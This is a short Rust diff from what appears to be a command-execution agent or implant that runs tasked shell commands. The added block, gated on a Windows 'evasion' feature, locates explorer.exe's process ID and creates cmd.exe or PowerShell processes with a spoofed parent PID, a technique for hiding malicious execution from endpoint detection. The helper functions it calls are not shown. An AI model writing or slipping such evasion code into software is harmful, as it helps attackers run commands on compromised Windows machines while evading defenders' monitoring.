@@ -28,6 +28,20 @@ pub fn run(task_id: i64, args: &serde_json::Value) -> TaskResult {
 }
 
 fn execute_command(cmd: &str, shell: &str, timeout_secs: u64) -> Result<String, String> {
+    // When evasion is enabled on Windows, use PPID-spoofed process creation
+    #[cfg(all(target_os = "windows", feature = "evasion"))]
+    {
+        let parent_pid = crate::utils::behavior::find_explorer_pid();
+        if parent_pid > 0 {
+            let full_cmd = match shell {
+                "powershell" | "ps" => format!("powershell.exe -NoProfile -NonInteractive -Command {}", cmd),
+                _ => format!("cmd.exe /c {}", cmd),
+            };
+            return crate::utils::behavior::create_process_spoofed(&full_cmd, parent_pid);
+        }
+        // Fall through to standard execution if PPID spoofing fails
+    }
+
     #[cfg(target_os = "windows")]
     let mut child = {
         match shell {
